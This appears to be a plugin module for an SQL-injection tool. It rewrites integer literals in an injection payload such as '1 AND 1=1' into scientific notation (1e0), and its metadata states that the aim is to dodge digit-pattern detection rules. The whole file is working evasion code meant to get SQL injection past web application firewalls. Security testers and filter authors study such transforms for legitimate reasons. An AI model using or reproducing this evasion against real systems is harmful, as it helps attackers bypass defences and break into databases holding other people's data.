import re

__example_payload__ = "1 AND 1=1"
__type__ = "rewrite numeric literals in scientific notation to dodge digit-pattern rules"
__category__ = "sqli"
__chain_stage__ = "lexical"
__contexts__ = ("query", "form")

# standalone integer literals only: 1=1 -> 1e0=1e0, but 1.5 / 0x1f stay untouched
_NUMBER = re.compile(r"(?<![\w.])0*([1-9]\d*|0)(?![\w.])")


def _scientific(match):
    digits = match.group(1)
    return "{}e0".format(digits)


def tamper(payload, **kwargs):
    if not payload:
        return payload
    return _NUMBER.sub(_scientific, payload)
